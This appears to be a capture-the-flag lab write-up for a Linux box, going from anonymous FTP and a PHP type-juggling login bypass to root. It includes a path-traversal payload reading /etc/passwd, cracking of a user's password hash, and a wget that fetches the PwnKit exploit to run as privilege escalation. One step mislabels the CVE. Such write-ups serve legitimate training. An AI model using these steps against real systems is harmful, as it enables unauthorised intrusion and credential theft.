
## Lab Details
- Difficulty: Intermediate 
- OS: Linux
- Foothold time: 1 hour 5 minutes
- Privesc time: 45 minutes 
- Total solve time: 1 hour 50 minutes

## Summary
- Initial access: PHP Type Juggling 
- Privilege escalation: PwnKit

## Enumeration
- Key findings: Identified open ports on target
##### Steps
```
$ nmap 192.168.55.101 -sC -sV -A -p-
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 20:48 +0000
Nmap scan report for 192.168.55.101
Host is up (0.00058s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b (RSA)
|   256 f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b (ECDSA)
|_  256 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Potato company
|_http-server-header: Apache/2.4.41 (Ubuntu)
2112/tcp open  ftp     ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
|_-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
```
## Foothold
- Path: PHP Type Juggling + LFI + Credential Harvesting 

##### Steps
- run `ffuf` to fuzz for endpoint
```
$ ffuf -u http://192.168.55.101//FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.55.101//FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 0ms]
```
- found the admin endpoint
- `ftp` allows anonymous authenticated
```
$ ftp 192.168.55.101 2112
Connected to 192.168.55.101.
220 ProFTPD Server (Debian) [::ffff:192.168.55.101]
Name (192.168.55.101:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.49.55 !
230-
230-The local time is: Sun Apr 05 20:50:22 2026
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||20387|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete
ftp> prompt off
Interactive mode off.
ftp> mget index.php.bak
local: index.php.bak remote: index.php.bak
229 Entering Extended Passive Mode (|||18223|)
150 Opening BINARY mode data connection for index.php.bak (901 bytes)
   901        1.58 MiB/s 
226 Transfer complete

```
- found backup file for `index.php`
- download the file and examine
- identified the `strcmp` function been used insecurely which allows for `PHP type juggling`
- essentially is when the input data type of the variable is not checked assuming all input is string
```
<html>
<head></head>
<body>

<?php

$pass= "potato"; //note Change this password regularly

if($_GET['login']==="1"){
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
    setcookie('pass', $pass, time() + 365*24*3600);
  }else{
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
  }
  exit();
}
?>


  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```
- modified the input data type to array since `strcmp()` cannot convert it to string it will return null thus `null==null` is true
![[Pasted image 20260406060923.png]]
- After login into the application LFI can be identified when fetch for login files 
![[Pasted image 20260406060738.png]]
- attempt to fetch `/etc/passwd`
```
POST /admin/dashboard.php?page=log HTTP/1.1
Host: 192.168.55.101
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: http://192.168.55.101
Connection: keep-alive
Referer: http://192.168.55.101/admin/dashboard.php?page=log
Cookie: pass=serdesfsefhijosefjtfgyuhjiosefdfthgyjh
Upgrade-Insecure-Requests: 1
Priority: u=0, i

file=../../../../../etc/passwd
```
- encrypt password for user `webadmin` is in `/etc/passwd` file
![[Pasted image 20260406060723.png]]

```
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```
- use `hashcat` to decrypt the password
```
$ hashcat hash -m 500  /usr/share/wordlists/rockyou.txt
<SNIP>
$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:dragon                 
<SNIP>
```
## Lateral Movement 
- Path:

##### Steps

## Privilege Escalation
- Path: `Pwnkit`
##### Steps
- `ssh` as `webadmin`
```
$ ssh webadmin@192.168.55.101 
```
- load and run `linpeas.sh`
```
webadmin@serv:~$ ./linpeas.sh 
<SNIP>
???????????? Executing Linux Exploit Suggester
? https://github.com/mzet-/linux-exploit-suggester
<SNIP>    
Vulnerable to CVE-2021-3560
<SNIP>
```
- found the target is vulnerable `pwnkit`
- download `pwnkit`
```
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
```
- execute the exploit and obtain root access
```
webadmin@serv:~$ ./PwnKit 
root@serv:/home/webadmin# ls
CVE-2022-2586.c  PwnKit  linpeas.sh  local.txt  polkit.sh  pspy64  snap  user.txt
root@serv:/home/webadmin# cd /root
root@serv:~# ls
proof.txt  root.txt  snap
```

## Lessons Learned
- Attack family: `PHP Type Juggling` + LFI + Credential Harvesting 
- Key takeaway:
	- How to exploit PHP Type Juggling 

## Resources
- References: